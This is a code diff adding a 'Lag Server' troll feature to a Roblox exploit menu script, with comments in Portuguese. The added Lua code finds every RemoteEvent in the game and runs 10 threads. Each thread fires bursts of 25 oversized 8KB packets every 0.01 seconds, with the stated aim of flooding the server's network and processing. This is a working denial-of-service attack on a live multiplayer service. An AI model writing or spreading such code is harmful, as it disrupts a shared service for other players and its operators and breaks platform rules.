@@ -19,7 +19,7 @@ VirtualInputManager = game:GetService("VirtualInputManager")
 TextChatService = game:GetService("TextChatService")
 
 -- BUILD MARKER: se esta linha NAO aparecer no console (F9), o executor carregou uma copia antiga/truncada
-print("[NIGHT MENU] BUILD NPC-ESP-FIX v2 | " .. os.date("%d/%m/%Y %H:%M"))
+print("[NIGHT MENU] BUILD LAG-SERVER BRUTAL v6 | " .. os.date("%d/%m/%Y %H:%M"))
 
 -- Limpar logs F9 a cada 5 segundos
 task.spawn(function()
@@ -145,6 +145,8 @@ waypointBind = nil
 waypointBindString = "None"
 multiWaypointTpBind = nil
 multiWaypointTpBindString = "None"
+lagServerBind = nil
+lagServerBindString = "None"
 
 -- Freecam Config & State
 freecamEnabled = false
@@ -15101,6 +15103,96 @@ local function soloDimOnCharAdded()
 	end
 end
 LocalPlayer.CharacterAdded:Connect(soloDimOnCharAdded)
+
+-- ========= LAG SERVER (Troll) =========
+-- Baseado no DeepHat Brutal Network Saturation (High Intensity Burst Mode), sem interface
+
+-- Configurações de poder
+local LAG_BURST_COUNT = 25      -- Quantos pacotes por rajada
+local LAG_THREAD_STRENGTH = 10  -- Threads simultâneas
+local LAG_PAYLOAD_SIZE = 8000   -- Tamanho do pacote (dados pesados)
+local LAG_REFRESH_RATE = 0.01   -- Delay mínimo entre rajadas
+
+lagServerEnabled = false
+lagServerThreads = {}
+lagServerToggleApi = nil
+lagServerPayloadData = string.rep("Z", LAG_PAYLOAD_SIZE) .. os.clock() -- Payload massivo pré-calculado
+
+local function lagServerGetRemotes()
+	local remotes = {}
+	for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+		if v:IsA("RemoteEvent") then
+			table.insert(remotes, v)
+		end
+	end
+	return remotes
+end
+
+-- Função de disparo de rajada (burst)
+local function lagServerExecuteBurst(remotes)
+	while lagServerEnabled do
+		local target = remotes[math.random(1, #remotes)]
+
+		if target then
+			-- Loop de rajada: dispara varios pacotes de uma vez so
+			for i = 1, LAG_BURST_COUNT do
+				pcall(function()
+					target:FireServer(lagServerPayloadData, i, "BRUTE_FORCE", math.random(), "STRESS")
+				end)
+			end
+		end
+
+		-- Delay mínimo para nao travar o SEU cliente completamente
+		task.wait(LAG_REFRESH_RATE)
+	end
+end
+
+local function lagServerStop()
+	lagServerEnabled = false
+	for _, thread in ipairs(lagServerThreads) do
+		task.cancel(thread)
+	end
+	lagServerThreads = {}
+end
+
+lagServerToggle = createToggle(trollCategory, "Lag Server", function(enabled)
+	pcall(function()
+		if enabled then
+			local remotes = lagServerGetRemotes()
+			if #remotes == 0 then
+				lagServerEnabled = false
+				showMenuToast("Lag Server", "Nenhum Remote encontrado! Verifique o ambiente.", Color3.fromRGB(255, 170, 70))
+				if lagServerToggleApi and lagServerToggleApi.setState then
+					lagServerToggleApi.setState(false)
+				end
+				return
+			end
+
+			lagServerEnabled = true
+			lagServerThreads = {}
+			for _ = 1, LAG_THREAD_STRENGTH do
+				table.insert(lagServerThreads, task.spawn(function()
+					lagServerExecuteBurst(remotes)
+				end))
+			end
+			showMenuToast("Lag Server", "Saturacao brutal ativa (" .. LAG_THREAD_STRENGTH .. " threads, burst " .. LAG_BURST_COUNT .. ")", Color3.fromRGB(255, 100, 100))
+		else
+			lagServerStop()
+		end
+	end)
+end, "Saturacao brutal de rede estilo DeepHat: 10 threads disparando rajadas de 25 pacotes pesados (8KB) em RemoteEvents a cada 0.01s. Enche o servidor de trafego e processamento de rede. Task.wait() mantem o FPS local estavel.", {
+	bindId = "lagserver",
+	getBindValue = function() return lagServerBind end,
+	getBindName = function() return lagServerBindString end,
+	setBind = function(bindValue, bindName)
+		lagServerBind = bindValue
+		lagServerBindString = bindDisplayName(bindValue, bindName)
+	end,
+	onReady = function(api)
+		lagServerToggleApi = api
+	end,
+})
+lagServerToggle.LayoutOrder = 12
 
 -- ========= AUTO REJOIN (Misc) =========
 autoRejoinToggle = createToggle(nil, "Auto Rejoin", function(enabled)
